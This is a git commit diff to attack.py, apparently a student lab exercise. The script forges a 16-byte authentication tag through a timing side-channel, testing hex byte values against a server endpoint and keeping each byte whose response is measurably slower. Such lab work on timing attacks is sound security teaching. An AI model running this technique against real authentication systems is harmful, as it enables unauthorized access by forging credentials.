1061547c0b0e56677d9d190ef0f6e04f54fe6dfa
zamplyy <jojar_kga@hotmail.com>
2018-10-09 10:42:35 +0200

    refactoring

--- attack.py
+++ attack.py
@@ -17,14 +17,9 @@ delayInt = 0.999
 user = "joarkarl100"
 url = "http://130.243.27.198/auth/" + delay + "/" + user + "/"
 
-startTag = "00000000000000000000000000000000"
-firstTime = requests.get(url + "startTag").elapsed.total_seconds()
-print("First Time with all zeros = " + str(firstTime))
 
 tags = ["00" for x in range(16)]
-tempTags = ["00" for x in range(16)]
 
-prevTag = "00"
 
 for x in range(16):
     found = 0
@@ -32,15 +27,15 @@ for x in range(16):
         for j in range(0,16):
             if found == 0:
                 partOfTag = (hex(i)[2] + hex(j)[2])
-                tempTags[x] = partOfTag
-                thisTime = testTag(buildTag(tempTags))
+                tags[x] = partOfTag
+                thisTime = testTag(buildTag(tags))
 
                 if thisTime > (delayInt * (x + 1)):
+                    #Testa igen för att säkertställa att den är rätt
+
                     print ("Found " + partOfTag + " as index " + str(x) + " of tag")
                     found = 1
-                    tags[x] = partOfTag
 
-print("    ") 
 print("    ")        
 print(buildTag(tags))
 print("done 😀")
